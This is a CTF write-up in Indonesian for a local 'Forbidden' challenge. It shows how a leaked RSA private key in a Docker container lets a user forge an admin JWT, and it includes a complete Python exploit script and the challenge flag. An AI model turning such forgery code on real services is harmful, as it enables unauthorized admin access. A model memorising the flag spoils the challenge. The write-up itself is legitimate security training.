# WriteUp: Forbidden

## Overview

* **Judul:** Forbidden
* **Kategori:** Access Control
* **Poin:** 25
* **Deskripsi:** Persetan dengan Forbidden: admin only.
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `forbidden.yml`. Informasi krusial didapatkan melalui inspeksi langsung ke dalam container Docker yang berjalan.

**Struktur Direktori (Container):**

```bash
/app
├── app (Binary, Go Executable)
├── keys/
│   ├── private.pem (CRITICAL VULNERABILITY)
│   └── public.pem
└── templates/

```

## Proses Penyelesaian

### 1. Reconnaissance (Docker Inspection)

Langkah pertama adalah melakukan enumerasi file di dalam container yang berjalan untuk memahami arsitektur keamanan aplikasi.

```bash
docker exec forbidden-web-1 ls -la keys/

```

**Temuan:**
Ditemukan file `keys/private.pem` di dalam container. Dalam implementasi kriptografi asimetris (RSA), kunci privat ini harus dijaga kerahasiaannya.

### 2. Vulnerability Analysis

* **Mekanisme Auth:** Aplikasi menggunakan **JSON Web Token (JWT)** yang disimpan pada cookie `auth_token`.
* **Algoritma:** RS256 (RSA Signature).
* **Celah Keamanan:** **Private Key Leak**. Karena penyerang memiliki akses ke `private.pem`, penyerang dapat membuat token JWT sendiri (forging) dengan payload sembarang (misalnya mengubah role menjadi admin) dan menandatanganinya secara sah. Server akan memvalidasi token tersebut sebagai token asli karena signature-nya valid.

### 3. Exploitation (JWT Forgery)

**Langkah 1: Ekstraksi Private Key**
Menyalin file private key dari container ke local host.

```bash
docker cp forbidden-web-1:/app/keys/private.pem .

```

**Langkah 2: Analisis Token**
Login sebagai user biasa (`WanZKey`) untuk melihat struktur payload JWT.

* Payload Asli: `{"username": "WanZKey", "role": "user", ...}`

**Langkah 3: Token Forgery**
Membuat token baru dengan payload yang dimodifikasi:

* **Payload:** `{"username": "WanZKey", "role": "admin"}`
* **Signing:** Menggunakan algoritma **RS256** dan file `private.pem` yang telah diekstrak.

**Langkah 4: Akses Admin**
Mengirim request ke endpoint `/admin/backups` dengan header Cookie `auth_token` yang berisi token palsu tersebut. Server memberikan akses ke file flag.

## Script Solver

Berikut adalah script Python untuk melakukan eksploitasi otomatis (Token Forgery & Flag Retrieval).

**File:** `exploit.py`

```python
import requests
import jwt # pip install pyjwt
import re
from urllib.parse import urljoin

# Target Config
BASE_URL = "http://localhost:1337"
USERNAME = "WanZKey"

def load_private_key():
    try:
        with open("private.pem", "rb") as f:
            return f.read()
    except FileNotFoundError:
        print("[-] Error: File 'private.pem' tidak ditemukan. Copy dari docker terlebih dahulu.")
        exit(1)

def exploit():
    # 1. Load Private Key
    print("[*] Loading Private Key from file...")
    private_key_data = load_private_key()
    print("[+] Private Key loaded successfully.")

    # 2. Setup Session & Headers (Mimic Browser)
    s = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Referer': f'{BASE_URL}/'
    }
    s.headers.update(headers)
    print(f"[*] Target: {BASE_URL}")

    # 3. Forge Token
    print("[*] Forging Token...")
    
    payload = {
        "username": USERNAME,
        "role": "admin"
    }
    
    # Sign token menggunakan private key file (RS256)
    token = jwt.encode(payload, private_key_data, algorithm="RS256")
    
    # Handle return type bytes/string differences in library versions
    if isinstance(token, bytes):
        token = token.decode('utf-8')
        
    print(f"[+] Token Forged: {token[:20]}...")
    s.cookies.set('auth_token', token)

    # 4. Access Endpoint /admin/backups
    target_url = f"{BASE_URL}/admin/backups"
    print(f"\n[*] Fetching Target: {target_url}")
    
    try:
        r = s.get(target_url, allow_redirects=True)
        print(f"[*] Status Code: {r.status_code}")
        
        print("\n" + "="*20 + " RESPONSE " + "="*20)
        print(r.text.strip())
        print("="*50)
        
        flag = re.search(r'pwn\{.*?\}', r.text)
        if flag:
            print(f"\n[!!!] JACKPOT! FLAG FOUND: {flag.group(0)}")
        else:
            print("\n[-] Flag pattern not found.")
            
    except Exception as e:
        print(f"[-] Request Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Flag

```
pwn{7a3d7c41bc92a26fb16efb18d0513e39}

```
